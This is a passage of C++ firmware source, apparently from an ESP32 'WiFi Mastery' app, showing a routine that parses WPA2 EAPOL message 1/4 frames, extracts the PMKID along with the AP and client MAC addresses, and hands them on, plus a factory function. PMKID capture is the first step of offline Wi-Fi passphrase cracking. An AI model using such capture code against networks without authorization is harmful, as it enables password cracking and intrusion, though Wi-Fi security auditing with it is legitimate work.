    const bool isPairwise = (keyInfo & 0x0008U) != 0U;
    const bool hasAck     = (keyInfo & 0x0080U) != 0U;
    const bool hasMic     = (keyInfo & 0x0100U) != 0U;

    // Message 1/4: Pairwise + Ack, no MIC
    if (!isPairwise || !hasAck || hasMic)
    {
        return;
    }

    // Key Data Length at offset +97..+98 (relative to EAPOL start)
    const uint16_t keyDataLen =
        (static_cast<uint16_t>(payload[eapolOffset + 97U]) << 8U) |
        payload[eapolOffset + 98U];

    if (keyDataLen < 22U) // Minimum: tag(1) + len(1) + OUI(3) + type(1) + PMKID(16)
    {
        return;
    }

    const size_t keyDataOffset = eapolOffset + 99U;
    if (keyDataOffset + keyDataLen > len)
    {
        return;
    }

    // Search Key Data for PMKID KDE: DD 14 00 0F AC 04
    for (size_t i = keyDataOffset; i + 22U <= keyDataOffset + keyDataLen; ++i)
    {
        if (payload[i] == 0xDDU && payload[i + 1U] == 20U &&
            payload[i + 2U] == 0x00U && payload[i + 3U] == 0x0FU &&
            payload[i + 4U] == 0xACU && payload[i + 5U] == 0x04U)
        {
            // Extract AP MAC (addr1 or addr3 depending on frame direction)
            // In message 1/4 from AP: addr2 = AP, addr1 = STA
            const uint8_t *apMac = &payload[10]; // addr2 (Source/Transmitter)
            const uint8_t *staMac = &payload[4]; // addr1 (Destination/Receiver)

            g_masteryInstance->onPmkidDetected(&payload[i + 6U], apMac, staMac);
            ESP_LOGI(TAG_WM, "PMKID found in EAPOL frame!");
            return;
        }
    }
}

} // namespace

// ── Factory ──────────────────────────────────────────────────────────────────

AppBase *createWifiMasteryApp()
{
    return new (std::nothrow) WiFiMasteryApp();
}
